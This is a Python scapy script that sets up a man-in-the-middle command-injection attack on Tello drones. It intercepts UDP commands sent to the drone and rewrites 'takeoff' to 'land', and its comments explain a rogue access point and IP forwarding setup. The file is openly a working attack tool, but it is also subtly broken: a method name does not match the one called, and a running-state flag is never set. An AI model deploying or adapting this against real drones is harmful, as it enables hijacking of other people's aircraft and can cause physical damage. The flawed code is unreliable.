from scapy.all import *
import sys
import threading
import time

# Tello Drone's IP on its own network
TELLO_IP = "192.168.10.1"
TELLO_PORT = 8889

class TelloCommandInjector:
    """
    A class to perform command injection attacks via Man-in-the-Middle (MitM) on Tello drones.
    Intercepts and modifies UDP packets sent to the drone.
    """

    def __init__(self, interface):
        self.interface = interface
        self.tello_ip = TELLO_IP
        self.tello_port = TELLO_PORT

    def packet_handler(self, packet):
        """
        Function to recieve, modify and forward packets.
        """
        
        try:
            # Check if it's a UDP packet to the drone's command port
            if packet.haslayer(UDP) and packet[IP].dst == self.tello_ip and packet[UDP].dport == self.tello_port:
                
                original_payload = packet[Raw].load.decode('utf-8')
                print(f"[+] Intercepted command: {original_payload}")

                modified_payload = original_payload

                # --- ATTACK LOGIC ---
                # Example: Change 'takeoff' command to 'land'
                if original_payload == "takeoff":
                    print("[!] MODIFICATION: Changing 'takeoff' to 'land'")
                    modified_payload = "land"
                
                # Forward the (potentially modified) packet to the drone
                print(f"[>] Forwarding command: {modified_payload} to {self.tello_ip}")
                
                new_packet = IP(dst=self.tello_ip, src=packet[IP].src) / \
                             UDP(dport=self.tello_port, sport=packet[UDP].sport) / \
                             modified_payload.encode('utf-8')
                
                send(new_packet, verbose=0)
        except Exception as e:
            print(f"Error processing packet: {e}")

    def _sniff(self):
        """
        The main sniffing loop.
        """
        print("--- Starting packet sniffing ---")
        sniff(iface=self.interface, 
              filter=f"udp and dst host {self.tello_ip} and port {self.tello_port}", 
              prn=self._packet_handler, 
              stop_filter=lambda p: not self.is_running)
        print("--- Stopped packet sniffing ---")

    def start(self):
        """
        Starts the MitM attack in a separate thread.
        """
        if not self.is_running:
            # This requires running the script with sudo for network sniffing
            print("Starting attack... (Requires root privileges)")
            self.is_running = True
            self.thread = threading.Thread(target=self._sniff)
            self.thread.start()
        else:
            print("Attack is already running.")

    def stop(self):
        """
        Stops the MitM attack.
        """
        if self.is_running:
            print("Stopping attack...")
            self.is_running = False
            if self.thread:
                self.thread.join(timeout=2) # Wait for the thread to finish
            print("Attack stopped.")
        else:
            print("Attack is not running.")

# Example of how to use this class (for testing purposes)
if __name__ == '__main__':
    # IMPORTANT: Replace 'wlan0' with the name of the network interface
    # that is configured to intercept the traffic (e.g., your rogue AP).
    # You must also enable IP forwarding on your system:
    # sudo sysctl -w net.ipv4.ip_forward=1
    
    print("Running cmdinjector.py in standalone test mode.")
    # This requires two network interfaces and proper network configuration.
    # One interface acts as an AP, the other connects to the Tello drone.
    attack = TelloCommandInjector(interface='wlan0') 
    
    try:
        attack.start()
        # Keep the main thread alive while the attack runs
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nUser interrupt detected.")
    finally:
        attack.stop()
        print("Test finished.")